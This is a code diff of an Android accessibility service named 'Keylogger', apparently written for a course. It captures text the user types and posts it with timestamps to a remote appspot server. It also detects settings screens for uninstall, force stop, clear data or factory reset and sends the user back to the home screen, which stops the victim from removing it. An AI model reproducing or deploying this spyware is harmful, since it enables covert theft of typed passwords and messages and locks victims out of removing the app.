@@ -4,77 +4,43 @@ import android.accessibilityservice.AccessibilityService;
 import android.os.AsyncTask;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.app.Notification;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
-import android.graphics.Canvas;
-import android.graphics.Rect;
-import android.graphics.drawable.BitmapDrawable;
-import android.graphics.drawable.Drawable;
 import android.os.Build;
-import android.os.Environment;
-import android.support.v4.app.NotificationCompat;
 import android.util.Base64;
-import android.view.SurfaceView;
-import android.view.WindowManager;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.widget.FrameLayout;
-import java.io.BufferedReader;
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileOutputStream;
-import java.io.FileReader;
-import java.io.IOException;
-import java.io.OutputStreamWriter;
-import java.io.UnsupportedEncodingException;
-import java.util.Date;
 
-
-import java.io.DataOutputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.util.Calendar;
-import java.text.SimpleDateFormat;
-import java.text.DateFormat;
-import java.util.Locale;
-
-import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.StringEntity;
-import org.apache.http.params.*;
-import org.apache.http.protocol.HTTP;
+import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.params.BasicHttpParams;
+import org.apache.http.params.HttpConnectionParams;
+import org.apache.http.params.HttpParams;
 
-/**
- * Created by Brian on 3/10/2017.
- */
+import java.io.UnsupportedEncodingException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Locale;
 
 public class Keylogger extends AccessibilityService {
-    
-public static Boolean Auto_Click = false;
-public static Boolean bypass = false;
+
+    public static Boolean Auto_Click = false;
+    public static Boolean bypass = false;
 
     private class SendToServerTask extends AsyncTask<String, Void, String> {
         @Override
         protected String doInBackground(String... params) {
-
-            //Log.d("Keylogger", params[0]);
-
             try {
-
                 String url = "https://cs460-android-keylogger.appspot.com";
 
                 HttpParams httpParameters = new BasicHttpParams();
                 HttpConnectionParams.setConnectionTimeout(httpParameters, 5000);
                 HttpConnectionParams.setSoTimeout(httpParameters, 5000);
 
-                StringEntity entity = new StringEntity(params[0], HTTP.UTF_8);
+                StringEntity entity = new StringEntity(params[0], "UTF-8");
                 entity.setContentType("text/plain");
 
                 HttpClient client = new DefaultHttpClient(httpParameters);
@@ -82,7 +48,6 @@ public static Boolean bypass = false;
 
                 httpPost.setEntity(entity);
                 client.execute(httpPost);
-
 
             } catch (Exception e) {
                 e.printStackTrace();
@@ -95,6 +60,7 @@ public static Boolean bypass = false;
     public void onServiceConnected() {
         Log.d("Keylogger", "Starting service");
     }
+
     public static void clickAtPosition(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo) {
         if (accessibilityNodeInfo != null) {
             try {
@@ -116,12 +82,11 @@ public static Boolean bypass = false;
                     clickAtPosition(i, i2, accessibilityNodeInfo.getChild(i3));
                 }
             } catch (Exception e) {
+                e.printStackTrace();
             }
         }
     }
-	
-	
-	
+
     public static String getAppNameFromPkgName(Context context, String str) {
         try {
             PackageManager packageManager = context.getPackageManager();
@@ -131,8 +96,8 @@ public static Boolean bypass = false;
             return "";
         }
     }
-	
-	public static String toBase64(String str) {
+
+    public static String toBase64(String str) {
         try {
             return Base64.encodeToString(str.getBytes("UTF-8"), 0);
         } catch (UnsupportedEncodingException e) {
@@ -140,29 +105,22 @@ public static Boolean bypass = false;
             return null;
         }
     }
-	
-	
-	
-	private String getEventText(AccessibilityEvent accessibilityEvent) {
+
+    private String getEventText(AccessibilityEvent accessibilityEvent) {
         return accessibilityEvent.getText().toString();
     }
 
-
     public void SendMeHome(int i) {
-        int i2 = i;
         try {
-            //Intent intent = r8;
             Intent intent = new Intent("android.intent.action.MAIN");
-            //Intent intent3 = intent;
-            intent = intent.addCategory("android.intent.category.HOME");
-            intent = intent.setFlags(i2);
+            intent.addCategory("android.intent.category.HOME");
+            intent.setFlags(i);
             startActivity(intent);
         } catch (Exception e) {
-            Exception exception = e;
+            e.printStackTrace();
         }
     }
 
-    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:12:0x0022 -> B:9:0x0017). Please submit an issue!!! */
     public void blockBack() {
         try {
             if (Build.VERSION.SDK_INT > 15) {
@@ -170,10 +128,12 @@ public static Boolean bypass = false;
                     try {
                         performGlobalAction(1);
                     } catch (Exception e) {
+                        e.printStackTrace();
                     }
                 }
             }
-        } catch (Exception e2) {
+        } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -183,17 +143,16 @@ public static Boolean bypass = false;
                 clickAtPosition(i, i2, getRootInActiveWindow());
             }
         } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
-
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-
         DateFormat df = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US);
         String time = df.format(Calendar.getInstance().getTime());
 
-        switch(event.getEventType()) {
+        switch (event.getEventType()) {
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                 String data = event.getText().toString();
                 SendToServerTask sendTask = new SendToServerTask();
@@ -215,67 +174,46 @@ public static Boolean bypass = false;
             default:
                 break;
         }
-        if (!bypass.booleanValue()) {
-			String str = "[" + getApplicationContext().getResources().getString(R.string.accessibility_service_label) + "]";
-			String string = getApplicationContext().getResources().getString(R.string.accessibility_service_label);
-			if (Build.VERSION.SDK_INT > 15) {
-				String lowerCase = accessibilityEvent.getClassName().toString().toLowerCase();
-				if ("com.android.settings.SubSettings".toLowerCase().equals(accessibilityEvent.getClassName().toString().toLowerCase()) && (getEventText(accessibilityEvent).toLowerCase().equals(str.toLowerCase()) || getEventText(accessibilityEvent).toLowerCase().equals(string.toLowerCase()))) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				String lowerCase2 = getEventText(accessibilityEvent).toLowerCase();
-				if (lowerCase2.contains("Force stop".toLowerCase()) || lowerCase2.contains("Delete app data".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				
-				if (lowerCase2.contains("Clear data".toLowerCase()) || lowerCase2.contains("Clear all data".toLowerCase()) || lowerCase2.contains("app data".toLowerCase()) || lowerCase2.contains("Clear cache".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				
-				
-				if (lowerCase2.contains("Uninstall".toLowerCase()) || lowerCase2.contains("remove".toLowerCase()) || lowerCase2.contains("uninstall".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				
-				if (lowerCase2.contains("Backup & reset".toLowerCase()) || lowerCase2.contains("Erase all data".toLowerCase()) || lowerCase2.contains("Reset phone".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				
-				if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && lowerCase2.contains("uninstall".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				if (lowerCase2.contains("Phone options".toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				if ((lowerCase2.contains("إيقاف".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) || (lowerCase2.contains("stop".toLowerCase()) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()))) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				if (accessibilityEvent.getPackageName().toString().contains("com.google.android.packageinstaller") && accessibilityEvent.getClassName().toString().toLowerCase().contains("android.app.alertdialog") && getEventText(accessibilityEvent).toLowerCase().contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-				if (!(lowerCase.equals("android.support.v7.widget.recyclerview") || lowerCase.equals("android.widget.linearlayout") || lowerCase.equals("android.widget.framelayout"))) {
-					return;
-				}
-				if ((accessibilityEvent.getPackageName().toString().equals("com.android.settings") || accessibilityEvent.getPackageName().toString().equals("com.miui.securitycenter")) && getEventText(accessibilityEvent).toLowerCase().contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
-					blockBack();
-					SendMeHome(268435456);
-				}
-			}
-		}
-    }
+
+        if (!bypass) {
+            String str = "[" + getApplicationContext().getResources().getString(R.string.accessibility_service_label) + "]";
+            String string = getApplicationContext().getResources().getString(R.string.accessibility_service_label);
+            if (Build.VERSION.SDK_INT > 15) {
+                String lowerCase = event.getClassName().toString().toLowerCase();
+                String lowerCase2 = getEventText(event).toLowerCase();
+
+                if ("com.android.settings.subsettings".equals(lowerCase) && (lowerCase2.equals(str.toLowerCase()) || lowerCase2.equals(string.toLowerCase()))) {
+                    blockBack();
+                    SendMeHome(268435456);
+                }
+
+                if (lowerCase2.contains("force stop") || lowerCase2.contains("delete app data") || lowerCase2.contains("clear data") || lowerCase2.contains("clear all data") || lowerCase2.contains("app data") || lowerCase2.contains("clear cache") || lowerCase2.contains("uninstall") || lowerCase2.contains("remove") || lowerCase2.contains("backup & reset") || lowerCase2.contains("erase all data") || lowerCase2.contains("reset phone") || lowerCase2.contains("phone options")) {
+                    blockBack();
+                    SendMeHome(268435456);
+                }
+
+                if (lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase()) && (lowerCase2.contains("uninstall") || lowerCase2.contains("stop"))) {
+                    blockBack();
+                    SendMeHome(268435456);
+                }
+
+                if (event.getPackageName().toString().contains("com.google.android.packageinstaller") && lowerCase.contains("android.app.alertdialog") && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
+                    blockBack();
+                    SendMeHome(268435456);
+                }
+
+                if (!lowerCase.equals("android.support.v7.widget.recyclerview") && !lowerCase.equals("android.widget.linearlayout") && !lowerCase.equals("android.widget.framelayout")) {
+                    if ((event.getPackageName().toString().equals("com.android.settings") || event.getPackageName().toString().equals("com.miui.securitycenter")) && lowerCase2.contains(getApplicationContext().getResources().getString(R.string.accessibility_service_label).toLowerCase())) {
+                        blockBack();
+                        SendMeHome(268435456);
+                    }
+                }
+            }
+        }
     }
 
     @Override
     public void onInterrupt() {
-
+        // Handle interruption
     }
-}
+			}
